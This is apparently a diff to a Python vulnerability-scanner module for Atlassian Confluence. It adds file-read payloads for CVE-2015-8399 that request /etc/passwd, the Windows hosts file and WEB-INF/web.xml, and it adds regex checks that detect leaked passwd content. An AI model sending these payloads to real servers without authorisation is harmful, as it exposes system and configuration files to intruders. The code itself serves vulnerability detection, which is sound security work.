@@ -35,6 +35,7 @@ from lib.tool import check
 from lib.tool import head
 from thirdparty import requests
 from time import sleep
+import re
 
 class AtlassianConfluence():
     def __init__(self):
@@ -90,6 +91,26 @@ class AtlassianConfluence():
         ]
 
         self.cve_2015_8399_payloads = [
+            {
+                'path': 'admin/viewdefaultdecorator.action?decoratorName=file:///etc/passwd',
+                'data': '',
+                'headers': head.merge(self.headers, {})
+            },
+            {
+                'path': 'admin/viewdefaultdecorator.action?decoratorName=file:///C:\Windows\System32\drivers\etc\hosts',
+                'data': '',
+                'headers': head.merge(self.headers, {})
+            },
+            {
+                'path': 'admin/viewdefaultdecorator.action?decoratorName=file:///C:/Windows/System32/drivers/etc/hosts',
+                'data': '',
+                'headers': head.merge(self.headers, {})
+            },
+            {
+                'path': 'admin/viewdefaultdecorator.action?decoratorName=/WEB-INF/web.xml',
+                'data': '',
+                'headers': head.merge(self.headers, {})
+            },
             {
                 'path': 'viewdefaultdecorator.action?decoratorName=file:///etc/passwd',
                 'data': '',
@@ -151,7 +172,8 @@ class AtlassianConfluence():
         '''
         vul_info = {}
         vul_info['app_name'] = self.app_name
-        vul_info['vul_type'] = 'RCE/FileRead'
+        # vul_info['vul_type'] = 'FileRead/RCE'
+        vul_info['vul_type'] = 'FileRead'
         vul_info['vul_id'] = 'CVE-2019-3396'
         vul_info['vul_method'] = 'POST'
 
@@ -189,16 +211,16 @@ class AtlassianConfluence():
                 return None
 
             if ((self.md in check.check_res(res.text, self.md))
-                or (('/sbin/nologin' in res.text) or ('root:x:0:0:root' in res.text))
+                or re.search(r'root:(x{1}|.*):\d{1,7}:\d{1,7}:root', res.text, re.I|re.M|re.S)
+                or (('Microsoft Corp' in res.text) 
+                    and ('Microsoft TCP/IP for Windows' in res.text))
                 or (('<?xml version="1.0" encoding="UTF-8"?>' in res.text) and ('Confluence' in res.text))
-                or ('Microsoft Corp' in res.text) 
-                or ('Microsoft TCP/IP for Windows' in res.text)
             ):
                 results = {
                     'Target': target,
                     'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                     'Method': vul_info['vul_method'],
-                    'Payload': res
+                    'Request': res
                 }
                 return results
 
@@ -245,15 +267,15 @@ class AtlassianConfluence():
                 return None
 
             if (('369630' in res.text)
-                or (('/sbin/nologin' in res.text) or ('root:x:0:0:root' in res.text))
-                # or ('Microsoft Corp' in res.text) 
-                # or ('Microsoft TCP/IP for Windows' in res.text)
+                or re.search(r'root:(x{1}|.*):\d{1,7}:\d{1,7}:root', res.text, re.I|re.M|re.S)
+                or (('Microsoft Corp' in res.text) 
+                    and ('Microsoft TCP/IP for Windows' in res.text))
             ):
                 results = {
                     'Target': target,
                     'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                     'Method': vul_info['vul_method'],
-                    'Payload': res
+                    'Request': res
                 }
                 return results
 
@@ -301,16 +323,16 @@ class AtlassianConfluence():
                 logger.logging(vul_info, 'Error')
                 return None
 
-            if ((('/sbin/nologin' in res.text) or ('root:x:0:0:root' in res.text))
+            if (re.search(r'root:(x{1}|.*):\d{1,7}:\d{1,7}:root', res.text, re.I|re.M|re.S)
+                or (('Microsoft Corp' in res.text) 
+                    and ('Microsoft TCP/IP for Windows' in res.text))
                 or (('<?xml version="1.0" encoding="UTF-8"?>' in res.text) and ('Confluence' in res.text))
-                or ('Microsoft Corp' in res.text) 
-                or ('Microsoft TCP/IP for Windows' in res.text)
             ):
                 results = {
                     'Target': target,
                     'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                     'Method': vul_info['vul_method'],
-                    'Payload': res
+                    'Request': res
                 }
                 return results
 
@@ -364,7 +386,7 @@ class AtlassianConfluence():
                     'Target': target,
                     'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                     'Method': vul_info['vul_method'],
-                    'Payload': res
+                    'Request': res
                 }
                 return results
             elif (self.md in check.check_res(base64.b64decode(res.headers.get('X-Confluence', '')).decode(), self.md)):
@@ -374,7 +396,7 @@ class AtlassianConfluence():
                     'Method': vul_info['vul_method'],
                     'Response-Headers': 'X-Confluence: XXX',
                     'Response-Decode': 'Base64',
-                    'Payload': res
+                    'Request': res
                 }
                 return results
 
